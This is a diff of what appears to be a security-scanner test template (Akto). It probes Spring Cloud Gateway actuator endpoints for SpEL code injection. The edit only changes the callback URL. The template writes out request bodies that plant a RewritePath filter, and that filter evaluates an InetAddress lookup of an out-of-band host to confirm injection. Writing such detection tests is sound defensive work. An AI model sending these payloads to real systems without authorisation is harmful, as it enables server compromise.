@@ -43,7 +43,7 @@ execute:
       - modify_url: "/actuator/gateway/routes/abcdefgh"
       - send_ssrf_req:
           url: "https://test-services.akto.io/store_uuid/${random_uuid}"
-      - replace_body: '{"predicates": [{"name": "Path","args": {"_genkey_0": "/abcdefgh/**"}}],"filters": [{"name":"RewritePath","args": {"_genkey_0": "#{T(java.net.InetAddress).getByName(\"https://test-services.akto.io/store_uuid/${random_uuid}\")}","_genkey_1": "/${path}"}}],"uri": "${urlVar}","order": 0}'
+      - replace_body: '{"predicates": [{"name": "Path","args": {"_genkey_0": "/abcdefgh/**"}}],"filters": [{"name":"RewritePath","args": {"_genkey_0": "#{T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")}","_genkey_1": "/${path}"}}],"uri": "${urlVar}","order": 0}'
       - validate:
           response_code:
             gte: 505
@@ -52,7 +52,7 @@ execute:
     - req:
       - modify_method: POST
       - modify_url: "/actuator/gateway/refresh"
-      - replace_body: '{"predicate": "Paths: [/abcdefgh], match trailing slash: true","route_id": "abcdefgh","filters": ["[[RewritePath #{T(java.net.InetAddress).getByName(\"https://test-services.akto.io/store_uuid/${random_uuid}\")} = /${path}], order = 1]"],"uri": "${urlVar}","order": 0}'
+      - replace_body: '{"predicate": "Paths: [/abcdefgh], match trailing slash: true","route_id": "abcdefgh","filters": ["[[RewritePath #{T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")} = /${path}], order = 1]"],"uri": "${urlVar}","order": 0}'
       - validate:
           response_code:
             gte: 505
